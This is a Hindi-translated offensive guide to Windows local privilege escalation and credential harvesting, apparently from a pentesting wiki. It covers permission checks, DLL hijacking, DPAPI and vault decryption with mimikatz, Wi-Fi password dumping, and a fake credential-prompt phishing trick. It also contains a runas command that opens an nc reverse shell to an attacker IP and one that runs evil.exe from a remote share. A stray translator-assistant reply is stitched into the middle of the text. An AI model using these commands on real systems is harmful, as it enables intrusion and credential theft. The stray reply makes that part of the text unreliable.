Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service विफल हो तो क्या कार्रवाई की जानी चाहिए। यह फीचर किसी binary की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary प्रतिस्थापित किया जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Applications

### Installed Applications

जाँचें **permissions of the binaries** (शायद आप किसी एक को overwrite कर सकते हैं और escalate privileges कर सकते हैं) और **folders** के permissions की भी जाँच करें ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँचें कि क्या आप किसी config file को संशोधित कर सकते हैं ताकि कोई विशेष फ़ाइल पढ़ी जा सके, या क्या आप किसी binary को बदल सकते हैं जिसे Administrator account (schedtasks) द्वारा चलाया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जांचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी दूसरे उपयोगकर्ता द्वारा executed किया जाएगा।**\
**पढ़ें** इस **निम्नलिखित पृष्ठ** को यह जानने के लिए कि दिलचस्प **autoruns locations to escalate privileges** कौन से हैं:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर्स

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver एक arbitrary kernel read/write primitive एक्सपोज़ करता है (बुरी तरह डिज़ाइन किए गए IOCTL handlers में सामान्य), तो आप kernel memory से सीधे SYSTEM token चुरा कर escalate कर सकते हैं। step‑by‑step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं, तो आप किसी process द्वारा लोड की गई DLL को hijack करके **escalate privileges** कर सकते हैं।

PATH के भीतर सभी फोल्डरों के permissions चेक करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जांच का दुरुपयोग करने के तरीके के बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file पर hardcoded अन्य जाने-पहचाने कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहर से **restricted services** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### राउटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करना, नियम बनाना, बंद करना, बंद करना...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप `nc.exe` को किसी पोर्ट पर listen करने के लिए उपयोग करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा allow किया जाना चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root के रूप में bash को आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` फाइलसिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए user credentials संग्रहीत करता है जिन्हें **Windows** उपयोगकर्ताओं को **स्वतः लॉग इन** करवा सकता है। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook, Twitter, Gmail आदि के क्रेडेंशियल्स यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनका उपयोग Windows स्वतः उपयोगकर्ता को लॉग इन कराने के लिए कर सकता है, जिसका मतलब यह है कि कोई भी **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** और Windows Vault का उपयोग करके दिए गए क्रेडेंशियल्स को इस्तेमाल कर सकता है, ताकि उपयोगकर्ता बार-बार username और password न डालें।

जब तक applications Credential Manager के साथ interact नहीं करते, मेरा नहीं मानना कि वे किसी दिए गए resource के लिए क्रेडेंशियल्स का उपयोग कर पाएँगे। इसलिए, यदि आपका application vault का उपयोग करना चाहता है, तो उसे किसी तरह default storage vault से उस resource के लिए क्रेडेंशियल्स के अनुरोध के लिए **communicate with the credential manager and request the credentials for that resource** करना चाहिए।

मशीन पर स्टोर किए गए क्रेडेंशियल्स की सूची दिखाने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए `credentials` का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्न उदाहरण SMB share के माध्यम से एक remote binary को कॉल करता है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric एन्क्रिप्शन के लिए एक तरीका प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम के अंदर asymmetric private keys के symmetric एन्क्रिप्शन में उपयोग होता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान करने के लिए किसी user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन रहस्यों से व्युत्पन्न एक symmetric key के माध्यम से keys के एन्क्रिप्शन को सक्षम करता है**। सिस्टम-स्तर के एन्क्रिप्शन के मामलों में यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्टेड user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में स्टोर होते हैं, जहाँ `{SID}` उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो उसी फ़ाइल में उपयोगकर्ता की private keys की रक्षा करने वाले master key के साथ सह-स्थित होती है**, आम तौर पर 64 bytes का random data होता है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुंच सीमित है, इसलिए इसकी सामग्री को `dir` कमांड से CMD में सूचीबद्ध नहीं किया जा सकता, हालांकि PowerShell से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त आर्गुमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

ये **credentials files protected by the master password** आमतौर पर निम्न स्थानों पर स्थित होती हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
यदि आप root हैं, तो `sekurlsa::dpapi` module के साथ **memory** से कई **DPAPI** **masterkeys** extract कर सकते हैं (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और automation कार्यों के लिए encrypted credentials को सुविधाजनक तरीके से स्टोर करने के लिए उपयोग किए जाते हैं। ये credentials **DPAPI** द्वारा सुरक्षित होते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जिस पर इन्हें बनाया गया था।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाई-फ़ाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पाएंगे

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप उपयुक्त `/masterkey` के साथ **Mimikatz** के `dpapi::rdg` मॉड्यूल का उपयोग करके किसी भी .rdg फ़ाइलों को **डिक्रिप्ट** कर सकते हैं।

You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
आप मेमोरी से **कई DPAPI masterkeys** Mimikatz के `sekurlsa::dpapi` मॉड्यूल के साथ निकाल सकते हैं।

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
लोग अक्सर Windows workstations पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **सहेजने** के लिए करते हैं, यह समझे बिना कि यह एक database फ़ाइल है। यह फ़ाइल इस स्थान पर स्थित है `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और इसे हमेशा ढूँढकर और जांचकर देखना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
ध्यान दें कि AppCmd.exe से पासवर्ड पुनर्प्राप्त करने के लिए आपको Administrator होना चाहिए और इसे High Integrity level के तहत चलाना होगा।  
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।  
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और इन्हें **पुनर्प्राप्त** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):  
यह कोड [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँच करें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **SYSTEM privileges के साथ चलाए जाते हैं**, कई **DLL Sideloading (जानकारी स्रोत** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कीज़
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys रजिस्ट्री key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर हो सकते हैं, इसलिए आपको देखना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस पथ के अंदर कोई प्रविष्टि पाते हैं तो वह संभवतः एक सहेजा गया SSH key होगा।  
यह एन्क्रिप्टेड रूप में संग्रहीत होता है लेकिन [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके इसे आसानी से डिक्रिप्ट किया जा सकता है.\

इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सेवा चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब मान्य नहीं है। मैंने कुछ ssh keys बनाए, उन्हें `ssh-add` से जोड़ा और ssh के जरिए किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को खोजने के लिए **metasploit** का उपयोग भी कर सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फाइल खोजें जिसका नाम **SiteList.xml** हो

### Cached GPP Pasword

पहले एक ऐसी सुविधा थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर custom local administrator accounts तैनात करने की अनुमति देती थी। हालांकि, इस तरीके में महत्वपूर्ण सुरक्षा दोष थे। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में स्टोर होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर के पासवर्ड, जो AES256 से encrypted थे और एक publicly documented default key का उपयोग करते थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। इससे गंभीर जोखिम पैदा होता था, क्योंकि इससे users को elevated privileges प्राप्त हो सकते थे।

इस जोखिम को कम करने के लिए, एक function विकसित किया गया जो स्थानीय रूप से cache किए गए GPP फ़ाइलों को स्कैन करता है जिनमें एक "cpassword" फ़ील्ड होती है जो खाली नहीं होती। ऐसी फ़ाइल मिलने पर, function पासवर्ड को decrypt करता है और एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल के स्थान के बारे में विवरण शामिल होते हैं, जो इस सुरक्षा कमजोरी की पहचान और समाधान में मदद करते हैं।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config के साथ credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials या यहाँ तक कि किसी अन्य उपयोगकर्ता के credentials दर्ज करने के लिए पूछ सकते हैं** यदि आपको लगता है कि वह उन्हें जानता होगा (ध्यान दें कि क्लाइंट से सीधे **पूछना** यानी सीधे **credentials** माँगना वास्तव में **जोखिमभरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जो credentials शामिल कर सकते हैं**

कुछ समय पहले ज्ञात फ़ाइलें जिनमें **passwords** **clear-text** या **Base64** में मौजूद थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the files you want searched) and I'll translate the relevant English text to Hindi per your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी जांचना चाहिए और इसके अंदर credentials के लिए देखना चाहिए

कई प्रोग्रामों द्वारा सेव किए गए **पासवर्डों को पुनर्प्राप्त** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**अन्य संभावित registry keys जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
